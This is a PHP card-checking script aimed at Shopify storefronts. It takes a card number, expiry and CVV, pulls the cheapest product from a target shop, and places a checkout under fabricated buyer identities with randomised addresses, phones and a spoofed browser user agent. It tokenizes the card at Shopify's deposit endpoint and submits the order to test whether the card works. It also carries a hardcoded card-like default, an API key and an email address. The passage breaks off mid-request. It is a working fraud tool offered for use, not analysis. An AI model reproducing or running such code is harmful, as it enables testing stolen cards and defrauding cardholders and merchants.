<?php
error_reporting(E_ALL & ~E_DEPRECATED);

$maxRetries = 5;
$retryCount = 0;

function error(string $message, $price = null, string $gateway = 'NONE', $cc = null) {
    global $retryCount;

    $status = ($message === "SITE DEAD w8 40mim And Try Again...") ? 'Success' : 'Error';
    $error = json_encode([
        'Status'  => $status,
        'Gateway' => $gateway,
        'Price'=> $price,
        'Response'   => $message,
        'Retries' => $retryCount,
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    
    echo $error;
    exit;
}

function SucessError(string $message, $price = null, string $gateway = 'NONE', $site = 'NONE', $cc1 = null) {
    global $retryCount;

    $error = json_encode([
        'Status'  => 'Success',
        'Gateway' => $gateway,
        'Price'=> $price,
        'Response'   => $message,
        'Retries' => $retryCount,
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    
    echo $error;
    exit;
}

function extractQueryFromFile(string $filePath, int $occurrence = 1): ?string {
    $content = @file_get_contents($filePath);
    if ($content === false) {
        return null;
    }
    $needle = "'query' => '";
    $pos = -1;
    for ($i = 0; $i < $occurrence; $i++) {
        $pos = strpos($content, $needle, $pos + 1);
        if ($pos === false) {
            return null;
        }
    }
    $start = $pos + strlen($needle);
    $end = strpos($content, "'", $start);
    if ($end === false) {
        return null;
    }
    return substr($content, $start, $end - $start);
}

require_once 'ua.php';
$agent = new userAgent();
$ua = $agent->generate('windows');

require_once 'usaddress.php';
$num_us = $randomAddress['numd'];
$address_us = $randomAddress['address1'];
$address = $num_us.' '.$address_us;
$city_us = $randomAddress['city'];
$state_us = $randomAddress['state'];
$zip_us = $randomAddress['zip'];

require_once 'genphone.php';
$areaCode = $areaCodes[array_rand($areaCodes)];
$phone = sprintf("+1%d%03d%04d", $areaCode, rand(200, 999), rand(1000, 9999));

// Important functions start
function find_between($content, $start, $end) {
  $startPos = strpos($content, $start);
  if ($startPos === false) {
    return '';
}
$startPos += strlen($start);
$endPos = strpos($content, $end, $startPos);
if ($endPos === false) { 
    return'';
}
return substr($content, $startPos, $endPos - $startPos);
}

$cc1 = $_GET['cc'] ?? '4970407189311280|09|2029|263';
if (empty($cc1)) {
    error('A valid card is required.', null, 'NONE', $cc1);
}

$cc1 = str_replace(array(':',";","|",",","=>","-"," ",'/',"|||"), "|", $cc1);

$cc_partes = explode("|", $cc1);
$cc = $cc_partes[0];
$month = $cc_partes[1];
$year = $cc_partes[2];
$cvv = $cc_partes[3];

if (strlen($year) <= 2) {
    $year = "20$year";
}

$sub_month = (int)$month;

$geoaddress = urlencode("$num_us, $address_us, $city_us");
// echo "<li>geoaddress: $geoaddress<li>";



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://us1.locationiq.com/v1/search?key=pk.87eafaf1c832302b01301bf903d7897e&q='.$geoaddress.'&format=json');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$geocoding = curl_exec($ch);

$geocoding_data = json_decode($geocoding, true);

$lat = isset($geocoding_data[0]['lat']) ? (float) $geocoding_data[0]['lat'] : 0.0;
$lon = isset($geocoding_data[0]['lon']) ? (float) $geocoding_data[0]['lon'] : 0.0;

// echo "<li>lat: $lat<li>";
// echo "<li>lon: $lon<li>";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resposta = curl_exec($ch);

$firstname = find_between($resposta, '"first":"', '"');
$lastname = find_between($resposta, '"last":"', '"');
// Remove or comment out the lines that generate a random email
// $email = find_between($resposta, '"email":"', '"');
// $serve_arr = array("gmail.com","yahoo.com","hotmail.com","outlook.com");
// $serv_rnd = $serve_arr[array_rand($serve_arr)];
// $email = str_replace("example.com", $serv_rnd, $email);

// Set your own email directly
$email = "legendxkeygrid@gmail.com"; // Replace with your actual email

function getMinimumPriceProductDetails(string $json): array {
    $data = json_decode($json, true);
    
    if (!is_array($data) || !isset($data['products'])) {
        throw new Exception('Invalid JSON format or missing products key');
    }

    // Initialize minPrice as null to find the minimum valid price (above 0.01)
    $minPrice = null;
    $minPriceDetails = [
        'id' => null,
        'price' => null,
        'title' => null,
    ];

    foreach ($data['products'] as $product) {
        foreach ($product['variants'] as $variant) {
            $price = (float) $variant['price'];
            // Skip prices below 0.01 (including 0.00)
            if ($price >= 0.01) {
                // If minPrice is null or the current price is lower than minPrice, update minPriceDetails
                if ($minPrice === null || $price < $minPrice) {
                    $minPrice = $price;
                    $minPriceDetails = [
                        'id' => $variant['id'],
                        'price' => $variant['price'],
                        'title' => $product['title'],
                    ];
                }
            }
        }
    }

    // If no valid price was found, return an error message or keep minPriceDetails as null.
    if ($minPrice === null) {
        throw new Exception('No products found with price greater than or equal to 0.01');
    }

    return $minPriceDetails;
}

$site1 = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);
$site1 = parse_url($site1, PHP_URL_HOST);
$site1 = 'https://' . $site1;
$site1 = filter_var($site1, FILTER_VALIDATE_URL);
if ($site1 === false) {
    error('Invalid URL.', null, 'NONE', $cc1);
}

    $site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
    $site = "$site2/products.json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $site);

    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
        'Accept: application/json',
    ]);

    $r1 = curl_exec($ch);
    if ($r1 === false) {
        error(curl_error($ch), null, 'NONE', $cc1);
    } else {
        curl_close($ch);
        
        try {
            $productDetails = getMinimumPriceProductDetails($r1);
            $minPriceProductId = $productDetails['id'];
            $minPrice = $productDetails['price'];
            $productTitle = $productDetails['title'];
        } catch (Exception $e) {
            error($e->getMessage(), null, 'NONE', $cc1);
        }
    }

if (empty($minPriceProductId)) {
    error('Product ID is Empty.', null, 'NONE', $cc1);
}

$urlbase = $site1;
$domain = parse_url($urlbase, PHP_URL_HOST); 
$cookie = 'cookie.txt';
$prodid = $minPriceProductId;
cart:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/'.$prodid.':1');

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
// curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-US,en;q=0.9',
    'priority: u=0, i',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$ua,
]);

$headers = [];
curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
    list($name, $value) = explode(':', $headerLine, 2) + [NULL, NULL];
    $name = trim($name);
    $value = trim($value);

    // Save the 'Location' header
    if (strtolower($name) === 'location') {
        $headers['Location'] = $value;
    }

    return strlen($headerLine);
});

$response = curl_exec($ch);

if (curl_errno($ch)) {
    curl_close($ch); // Always close the previous handle before retrying
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart; // Retry the entire operation
    } else {
        error(curl_error($ch), $minPrice, 'NONE', $cc1);
    }
}
file_put_contents('php.php', $response );
$finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
$web_build_id = 'db0237b7310293c9fb41cbfd6a9f8683dfa53fe0';
if (empty($web_build_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart; // Retry the entire operation
    } else {
    error('Cloudflare Bypass Faild', $minPrice, 'NONE', $cc1);
}
}
$x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
if (empty($x_checkout_one_session_token)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart; // Retry the entire operation
    } else {
    error('Missing Special token 1.', $minPrice, 'NONE', $cc1);
}
}
$queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
if (empty($queue_token)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart; // Retry the entire operation
    } else {
    error('Missing Special token 2.', $minPrice, 'NONE', $cc1);
}
}

$stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
if (empty($stable_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart; // Retry the entire operation
    } else {
    error('Missing Special token 3.', $minPrice, 'NONE', $cc1);
}
}
$paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
if (empty($paymentMethodIdentifier)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart; // Retry the entire operation
    } else {
    error('Missing Special token 4.', $minPrice, 'NONE', $cc1);
}
}
$checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
$checkoutToken = '';
if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
    $checkoutToken = $matches[1];
}

card:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'origin: https://checkout.shopifycs.com',
    'priority: u=1, i',
    'referer: https://checkout.shopifycs.com/',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.$ua,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"'.$firstname.' '.$lastname.'"},"payment_session_scope":"'.$domain.'"}');
$response2 = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card; // Retry the entire operation
    } else {
    error(curl_error($ch), $minPrice, 'NONE', $cc1);
}
}
$response2js = json_decode($response2, true);
$cctoken = $response2js['id'];
if (empty($cctoken)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card; // Retry the entire operation
    } else {
    error('Missing special token 5. ID', $minPrice, 'NONE', $cc1);
}
}

proposal:
sleep(2);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=Proposal');

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-GB',
    'content-type: application/json',
    'origin: ' . $urlbase,
    'priority: u=1, i',
    'referer: ' . $urlbase . '/',
    'sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'shopify-checkout-client: checkout-web/1.0',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-build-id: ' . $web_build_id,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'query' => extractQueryFromFile('jsonq.txt', 1),
        'variables' => [
                'sessionInput' => [
                    'sessionToken' => $x_checkout_one_session_token
                ],
                'queueToken' => $queue_token,
            'discounts' => [
                'lines' => [],
                'acceptUnexpectedDiscounts' => true
            ],
            'delivery' => [
                'deliveryLines' => [
                    [
                        'destination' => [
                            'partialStreetAddress' => [
                                    'address1' => $address,
                                    'address2' => '',
                                    'city' => $city_us,
                                    'countryCode' => 'US',
                                    'postalCode' => $zip_us,
                                    'firstName' => $firstname,
                                    'lastName' => $lastname,
                                    'zoneCode' => $state_us,
                                    'phone' => $phone,
                                    'oneTimeUse' => false,
                                    'coordinates' => [
                                        'latitude' => $lat,
                                        'longitude' => $lon
                                ]
                            ]
                        ],
                        'selectedDeliveryStrategy' => [
                            'deliveryStrategyMatchingConditions' => [
                                'estimatedTimeInTransit' => [
                                    'any' => true
                                ],
                                'shipments' => [
                                    'any' => true
                                ]
                            ],
                            'options' => new stdClass()
                        ],
                        'targetMerchandiseLines' => [
                            'any' => true
                        ],
                        'deliveryMethodTypes' => [
                            'SHIPPING',
                            'LOCAL'
                        ],
                        'expectedTotalPrice' => [
                            'any' => true
                        ],
                        'destinationChanged' => true
                    ]
                ],
                'noDeliveryRequired' => [],
                'useProgressiveRates' => false,
                'prefetchShippingRatesStrategy' => null,
                'supportsSplitShipping' => true
            ],
            'deliveryExpectations' => [
                'deliveryExpectationLines' => []
            ],
            'merchandise' => [
                'merchandiseLines' => [
                    [
                        'stableId' => $stable_id,
                        'merchandise' => [
                            'productVariantReference' => [
                                'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                'properties' => [
                                    [
                                        'name' => '_minimum_allowed',
                                        'value' => [
                                            'string' => ''
                                        ]
                                    ]
                                ],
                                'sellingPlanId' => null,
                                'sellingPlanDigest' => null
                            ]
                        ],
                        'quantity' => [
                            'items' => [
                                'value' => 1
                            ]
                        ],
                        'expectedTotalPrice' => [
                            'value' => [
                                'amount' => $minPrice,
                                'currencyCode' => 'USD'
                            ]
                        ],
                        'lineComponentsSource' => null,
                        'lineComponents' => []
                    ]
                ]
            ],
            'payment' => [
                'totalAmount' => [
                    'any' => true
                ],
                'paymentLines' => [],
                'billingAddress' => [
                    'streetAddress' => [
                        'address1' => $address,
                        'address2' => '',
                        'city' => $city_us,
                        'countryCode' => 'US',
                        'postalCode' => $zip_us,
                        'firstName' => $firstname,
                        'lastName' => $lastname,
                        'zoneCode' => $state_us,
                        'phone' => $phone,
                    ]
                ]
            ],
            'buyerIdentity' => [
                'customer' => [
                    'presentmentCurrency' => 'USD',
                    'countryCode' => 'US'
                ],
                'email' => $email,
                'emailChanged' => false,
                'phoneCountryCode' => 'US',
                'marketingConsent' => [],
                'shopPayOptInPhone' => [
                    'countryCode' => 'US'
                ],
                'rememberMe' => false
            ],
            'tip' => [
                'tipLines' => []
            ],
            'taxes' => [
                'proposedAllocations' => null,
                'proposedTotalAmount' => null,
                'proposedTotalIncludedAmount' => [
                    'value' => [
                        'amount' => '0',
                        'currencyCode' => 'USD'
                    ]
                ],
                'proposedMixedStateTotalAmount' => null,
                'proposedExemptions' => []
            ],
            'note' => [
                'message' => null,
                'customAttributes' => []
            ],
            'localizationExtension' => [
                'fields' => []
            ],
            'nonNegotiableTerms' => null,
            'scriptFingerprint' => [
                'signature' => null,
                'signatureUuid' => null,
                'lineItemScriptChanges' => [],
                'paymentScriptChanges' => [],
                'shippingScriptChanges' => []
            ],
            'optionalDuties' => [
                'buyerRefusesDuties' => false
            ]
        ],
        'operationName' => 'Proposal'
]));

$response3 = curl_exec($ch);
// echo "<li>step_3: $response3<li>";
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto proposal; // Retry the entire operation
    } else {
    $err = 'cURL error: ' . curl_error($ch);
    $result = json_encode([
        'Response' => $err,
        'Price'=> $minPrice,
    ]);
    echo $result;
    exit;
}
}


$decoded = json_decode($response3);

$gateway = '';
$paymentMethodName = 'null'; // Valor predeterminado en caso de que no haya nombre de método de pago

if (isset($decoded->data->session->negotiate->result->sellerProposal)) {
    $firstStrategy = $decoded->data->session->negotiate->result->sellerProposal;
    
    if (empty($firstStrategy)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal; // Retry the entire operation
        } else {
            error('Missing Special token 6. null', $minPrice, $gateway, $cc1);
        }
    } else {
        // Si `availablePaymentLines` existe y tiene elementos, busca el nombre del método de pago
        if (!empty($firstStrategy->payment->availablePaymentLines)) {
            foreach ($firstStrategy->payment->availablePaymentLines as $paymentLine) {
                if (isset($paymentLine->paymentMethod->name)) {
                    $paymentMethodName = $paymentLine->paymentMethod->name;
                    break; // Sal del bucle una vez que encuentres el primer nombre de método de pago
                }
            }
        }
    }
}

// Asignar el nombre del método de pago al resultado final
$gateway = $paymentMethodName;

if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle)) {
    $handle = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle;
    } 
    if (empty($handle)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal;
        } else {
            error('Missing Special token 8.', $minPrice, $gateway, $cc1);
        }
    }
    if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount)) {
        $delamount = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount;
    }
    if (empty($delamount)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal;
        } else {
            error('Missing Special token 7.', $minPrice, $gateway, $cc1);
        }
    }
    if (isset($firstStrategy->tax->totalTaxAmount->value->amount)) {
        $tax = $firstStrategy->tax->totalTaxAmount->value->amount;
    }
    elseif (empty($tax)) {
        if ($retryCount < $maxRetries) {
                $retryCount++;
                goto proposal;
        }
        error('Tax amount is empty', $minPrice, $gateway, $cc1);
    }
    $currencycode = $firstStrategy->tax->totalTaxAmount->value->currencyCode;
    $totalamt = $firstStrategy->runningTotal->value->amount;
    $resultg = json_encode([
    'Response' => 'Success',
    'Details' => [
        'Price' => $minPrice,
        'Shipping' => $delamount,
        'Tax' => $tax,
        'Total' => $totalamt,
        'Currency' => $currencycode,
        'Gateway' => $gateway,
    ],
]);
    //echo $resultg;
if ($totalamt == '10.98' && $currencycode == 'USD') {
    $postf = json_encode([
        'query' => extractQueryFromFile('jsonq.txt', 2),
                'variables' => [
                    'input' => [
                        'sessionInput' => [
                            'sessionToken' => $x_checkout_one_session_token
                        ],
                        'queueToken' => $queue_token,
                        'discounts' => [
                            'lines' => [],
                            'acceptUnexpectedDiscounts' => true
                        ],
                        'delivery' => [
                            'deliveryLines' => [
                                [
                                    'selectedDeliveryStrategy' => [
                                        'deliveryStrategyMatchingConditions' => [
                                            'estimatedTimeInTransit' => [
                                                'any' => true
                                            ],
                                            'shipments' => [
                                                'any' => true
                                            ]
                                        ],
                                        'options' => new stdClass()
                                    ],
                                    'targetMerchandiseLines' => [
                                        'lines' => [
                                            [
                                                'stableId' => $stable_id
                                            ]
                                        ]
                                    ],
                                    'deliveryMethodTypes' => [
                                        'NONE'
                                    ],
                                    'expectedTotalPrice' => [
                                        'any' => true
                                    ],
                                    'destinationChanged' => true
                                ]
                            ],
                            'noDeliveryRequired' => [],
                            'useProgressiveRates' => false,
                            'prefetchShippingRatesStrategy' => null,
                            'supportsSplitShipping' => true
                        ],
                        'deliveryExpectations' => [
                            'deliveryExpectationLines' => []
                        ],
                        'merchandise' => [
                            'merchandiseLines' => [
                                [
                                    'stableId' => $stable_id,
                                    'merchandise' => [
                                        'productVariantReference' => [
                                            'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                            'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                            'properties' => [],
                                            'sellingPlanId' => null,
                                            'sellingPlanDigest' => null
                                        ]
                                    ],
                                    'quantity' => [
                                        'items' => [
                                            'value' => 1
                                        ]
                                    ],
                                    'expectedTotalPrice' => [
                                        'value' => [
                                            'amount' => $minPrice,
                                            'currencyCode' => 'USD'
                                        ]
                                    ],
                                    'lineComponentsSource' => null,
                                    'lineComponents' => []
                                ]
                            ]
                        ],
                        'payment' => [
                            'totalAmount' => [
                                'any' => true
                            ],
                            'paymentLines' => [
                                [
                                    'paymentMethod' => [
                                        'directPaymentMethod' => [
                                            'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                            'sessionId' => $cctoken,
                                            'billingAddress' => [
                                                'streetAddress' => [
                                                    'address1' => $address,
                                                    'address2' => '',
                                                    'city' => $city_us,
                                                    'countryCode' => 'US',
                                                    'postalCode' => $zip_us,
                                                    'firstName' => $firstname,
                                                    'lastName' => $lastname,
                                                    'zoneCode' => $state_us,
                                                    'phone' => ''
                                                ]
                                            ],
                                            'cardSource' => null
                                        ],
                                        'giftCardPaymentMethod' => null,
                                        'redeemablePaymentMethod' => null,
                                        'walletPaymentMethod' => null,
                                        'walletsPlatformPaymentMethod' => null,
                                        'localPaymentMethod' => null,
                                        'paymentOnDeliveryMethod' => null,
                                        'paymentOnDeliveryMethod2' => null,
                                        'manualPaymentMethod' => null,
                                        'customPaymentMethod' => null,
                                        'offsitePaymentMethod' => null,
                                        'customOnsitePaymentMethod' => null,
                                        'deferredPaymentMethod' => null,
                                        'customerCreditCardPaymentMethod' => null,
                                        'paypalBillingAgreementPaymentMethod' => null
                                    ],
                                    'amount' => [
                                        'value' => [
                                            'amount' => $totalamt,
                                            'currencyCode' => 'USD'
                                        ]
                                    ],
                                    'dueAt' => null
                                ]
                            ],
                            'billingAddress' => [
                                'streetAddress' => [
                                    'address1' => $address,
                                    'address2' => '',
                                    'city' => $city_us,
                                    'countryCode' => 'US',
                                    'postalCode' => $zip_us,
                                    'firstName' => $firstname,
                                    'lastName' => $lastname,
                                    'zoneCode' => $state_us,
                                    'phone' => ''
                                ]
                            ]
                        ],
                        'buyerIdentity' => [
                            'customer' => [
                                'presentmentCurrency' => 'US',
                                'countryCode' => 'US'
                            ],
                            'email' => $email,
                            'emailChanged' => false,
                            'phoneCountryCode' => 'US',
                            'marketingConsent' => [],
                            'shopPayOptInPhone' => [
                                'countryCode' => 'US'
                            ],
                            'rememberMe' => false
                        ],
                        'tip' => [
                            'tipLines' => []
                        ],
                        'taxes' => [
                            'proposedAllocations' => null,
                            'proposedTotalAmount' => [
                                'value' => [
                                    'amount' => $tax,
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'proposedTotalIncludedAmount' => null,
                            'proposedMixedStateTotalAmount' => null,
                            'proposedExemptions' => []
                        ],
                        'note' => [
                            'message' => null,
                            'customAttributes' => []
                        ],
                        'localizationExtension' => [
                            'fields' => []
                        ],
                        'nonNegotiableTerms' => null,
                        'scriptFingerprint' => [
                            'signature' => null,
                            'signatureUuid' => null,
                            'lineItemScriptChanges' => [],
                            'paymentScriptChanges' => [],
                            'shippingScriptChanges' => []
                        ],
                        'optionalDuties' => [
                            'buyerRefusesDuties' => false
                        ]
                    ],
                    'attemptToken' => $checkoutToken,
                    'metafields' => [],
                    'analytics' => [
                        'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                        'pageId' => $stable_id
                    ]
                ],
                'operationName' => 'SubmitForCompletion'
            ]);
}
elseif ($currencycode == 'USD') {
    $postf = json_encode([
        'query' => extractQueryFromFile('jsonq.txt', 3),
            'variables' => [
                'input' => [
                    'sessionInput' => [
                        'sessionToken' => $x_checkout_one_session_token
                    ],
                    'queueToken' => $queue_token,
                    'discounts' => [
                        'lines' => [],
                        'acceptUnexpectedDiscounts' => true
                    ],
                    'delivery' => [
                        'deliveryLines' => [
                            [
                                'destination' => [
                                    'streetAddress' => [
                                        'address1' => $address,
                                        'address2' => '',
                                        'city' => $city_us,
                                        'countryCode' => 'US',
                                        'postalCode' => $zip_us,
                                        'firstName' => $firstname,
                                        'lastName' => $lastname,
                                        'zoneCode' => $state_us,
                                        'phone' => $phone,
                                        'oneTimeUse' => false,
                                        'coordinates' => [
                                            'latitude' => $lat,
                                            'longitude' => $lon
                                        ]
                                    ]
                                ],
                                'selectedDeliveryStrategy' => [
                                    'deliveryStrategyByHandle' => [
                                        'handle' => $handle,
                                        'customDeliveryRate' => false
                                    ],
                                    'options' => new stdClass()
                                ],
                                'targetMerchandiseLines' => [
                                    'lines' => [
                                        [
                                            'stableId' => $stable_id
                                        ]
                                    ]
                                ],
                                'deliveryMethodTypes' => [
                                    'SHIPPING',
                                    'LOCAL'
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => $delamount,
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'destinationChanged' => false
                            ]
                        ],
                        'noDeliveryRequired' => [],
                        'useProgressiveRates' => false,
                        'prefetchShippingRatesStrategy' => null,
                        'supportsSplitShipping' => true
                    ],
                    'deliveryExpectations' => [
                        'deliveryExpectationLines' => []
                    ],
                    'merchandise' => [
                        'merchandiseLines' => [
                            [
                                'stableId' => $stable_id,
                                'merchandise' => [
                                    'productVariantReference' => [
                                        'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                        'properties' => [],
                                        'sellingPlanId' => null,
                                        'sellingPlanDigest' => null
                                    ]
                                ],
                                'quantity' => [
                                    'items' => [
                                        'value' => 1
                                    ]
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => $minPrice,
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'lineComponentsSource' => null,
                                'lineComponents' => []
                            ]
                        ]
                    ],
                    'payment' => [
                        'totalAmount' => [
                            'any' => true
                        ],
                        'paymentLines' => [
                            [
                                'paymentMethod' => [
                                    'directPaymentMethod' => [
                                        'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                        'sessionId' => $cctoken,
                                        'billingAddress' => [
                                            'streetAddress' => [
                                                'address1' => $address,
                                                'address2' => '',
                                                'city' => $city_us,
                                                'countryCode' => 'US',
                                                'postalCode' => $zip_us,
                                                'firstName' => $firstname,
                                                'lastName' => $lastname,
                                                'zoneCode' => $state_us,
                                                'phone' => $phone
                                            ]
                                        ],
                                        'cardSource' => null
                                    ],
                                    'giftCardPaymentMethod' => null,
                                    'redeemablePaymentMethod' => null,
                                    'walletPaymentMethod' => null,
                                    'walletsPlatformPaymentMethod' => null,
                                    'localPaymentMethod' => null,
                                    'paymentOnDeliveryMethod' => null,
                                    'paymentOnDeliveryMethod2' => null,
                                    'manualPaymentMethod' => null,
                                    'customPaymentMethod' => null,
                                    'offsitePaymentMethod' => null,
                                    'customOnsitePaymentMethod' => null,
                                    'deferredPaymentMethod' => null,
                                    'customerCreditCardPaymentMethod' => null,
                                    'paypalBillingAgreementPaymentMethod' => null
                                ],
                                'amount' => [
                                    'value' => [
                                        'amount' => $totalamt,
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'dueAt' => null
                            ]
                        ],
                        'billingAddress' => [
                            'streetAddress' => [
                                'address1' => $num_us . $address_us,
                                'address2' => '',
                                'city' => $city_us,
                                'countryCode' => 'US',
                                'postalCode' => $zip_us,
                                'firstName' => $firstname,
                                'lastName' => $lastname,
                                'zoneCode' => $state_us,
                                'phone' => $phone
                            ]
                        ]
                    ],
                    'buyerIdentity' => [
                        'customer' => [
                            'presentmentCurrency' => 'USD',
                            'countryCode' => 'US'
                        ],
                        'email' => $email,
                        'emailChanged' => false,
                        'phoneCountryCode' => 'US',
                        'marketingConsent' => [],
                        'shopPayOptInPhone' => [
                            'countryCode' => 'US'
                        ]
                    ],
                    'tip' => [
                        'tipLines' => []
                    ],
                    'taxes' => [
                        'proposedAllocations' => null,
                        'proposedTotalAmount' => [
                            'value' => [
                                'amount' => $tax,
                                'currencyCode' => 'USD'
                            ]
                        ],
                        'proposedTotalIncludedAmount' => null,
                        'proposedMixedStateTotalAmount' => null,
                        'proposedExemptions' => []
                    ],
                    'note' => [
                        'message' => null,
                        'customAttributes' => []
                    ],
                    'localizationExtension' => [
                        'fields' => []
                    ],
                    'nonNegotiableTerms' => null,
                    'scriptFingerprint' => [
                        'signature' => null,
                        'signatureUuid' => null,
                        'lineItemScriptChanges' => [],
                        'paymentScriptChanges' => [],
                        'shippingScriptChanges' => []
                    ],
                    'optionalDuties' => [
                        'buyerRefusesDuties' => false
                    ]
                ],
                'attemptToken' => ''.$checkoutToken.'-0a6d87fj9zmj',
                'metafields' => [],
                'analytics' => [
                    'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                    'pageId' => $stable_id
                ]
            ],
            'operationName' => 'SubmitForCompletion'
